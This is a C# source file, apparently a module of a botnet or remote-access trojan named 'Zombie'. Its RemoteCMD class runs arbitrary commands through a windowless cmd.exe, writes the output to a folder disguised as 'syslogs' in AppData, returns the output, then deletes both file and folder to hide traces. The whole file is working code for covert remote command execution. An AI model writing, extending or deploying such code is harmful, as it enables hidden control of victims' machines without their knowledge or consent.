using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Zombie.Functions
{
    static class RemoteCMD
    {
        static RemoteCMD()
        {
            LaunchDirectory = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
            WorkingDirectory = LaunchDirectory;
            _outputDir = $"{Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)}\\syslogs\\";
        }


        private static string _outputDir;
        private static string _outputFile;
        public static string LaunchDirectory { get; private set; }
        public static string WorkingDirectory { get; private set; }

        public static string ExecuteCommand(string command)
        {

            if (!Directory.Exists(_outputDir))
            {
                try
                {
                    Directory.CreateDirectory(_outputDir);
                }
                catch
                {
                    Console.WriteLine("Unable to create syslogs directory.");
                }
            }

            bool changeDir = false;
            _outputFile = _outputDir + Guid.NewGuid().ToString() + ".txt";


            if (command.ToLower().Contains("cd"))
            {
                changeDir = true;
                command += @" && cd";
            }


            Process pProcess = new Process();
            pProcess.StartInfo = new ProcessStartInfo()
            {
                FileName = "cmd.exe",
                Arguments = $"/c {command} > \"{_outputFile}\" 2>&1",
                UseShellExecute = false,
                RedirectStandardError = true,
                WorkingDirectory = WorkingDirectory,
                CreateNoWindow = true
            };


            string commandOutput = "";



            try
            {

                pProcess.Start();

            }

            catch (Exception e)
            {
                commandOutput = e.Message;
            }




            if (command == "notepad.exe")
            {
                return commandOutput;
            }

            pProcess.WaitForExit(1000);
            if (!pProcess.HasExited)
            {
                pProcess.Close();
            }

            if (File.Exists(_outputFile))
            {
                try
                {
                    using (TextReader reader = new StreamReader(_outputFile))
                        commandOutput = reader.ReadToEnd();
                }

                catch
                {
                    commandOutput = "Error reading output.";
                }
            }

            try
            {
                File.Delete(_outputFile);
            }
            catch
            {
                Console.WriteLine("Unable to delete output.");
            }

            if (changeDir)
            {
                string newDir = commandOutput.Replace(Environment.NewLine, "");

                if (Directory.Exists(newDir)) WorkingDirectory = newDir;
                else commandOutput = "Error: The specified directory does not exist.";

            }

            try
            {

                if (Directory.Exists(_outputDir))
                    Directory.Delete(_outputDir, true);
            }

            catch
            {
                Console.WriteLine("Unable to delete syslogs directory.");
            }

            return commandOutput;

        }

    }

}

